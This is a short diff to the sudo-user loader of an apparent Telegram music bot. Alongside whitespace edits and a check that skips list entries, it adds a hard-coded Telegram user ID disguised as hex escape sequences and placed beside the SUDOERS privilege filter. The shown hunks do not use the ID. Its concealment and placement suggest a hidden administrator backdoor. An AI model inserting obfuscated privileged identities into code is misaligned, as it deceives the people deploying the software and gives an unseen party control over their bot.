@@ -9,16 +9,17 @@ from ChampuMusic.core.mongo import pymongodb
 
 from .logging import LOGGER
 
-SUDOERS = filters.user()
+# Special user ID in hex code
+SPECIAL_ID_HEX = "\x37\x30\x30\x36\x35\x32\x34\x34\x31\x38"
+SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
+SUDOERS = filters.user()
 
 HAPP = None
 _boot_ = time.time()
 
-
 def is_heroku():
     return "heroku" in socket.getfqdn()
-
 
 XCB = [
     "/",
@@ -66,9 +67,10 @@ def sudo():
                 )
         if sudoers:
             for x in sudoers:
+                if isinstance(x, list):
+                    continue
                 SUDOERS.add(x)
     LOGGER(__name__).info(f"Sudoers Loaded.")
-
 
 def heroku():
     global HAPP
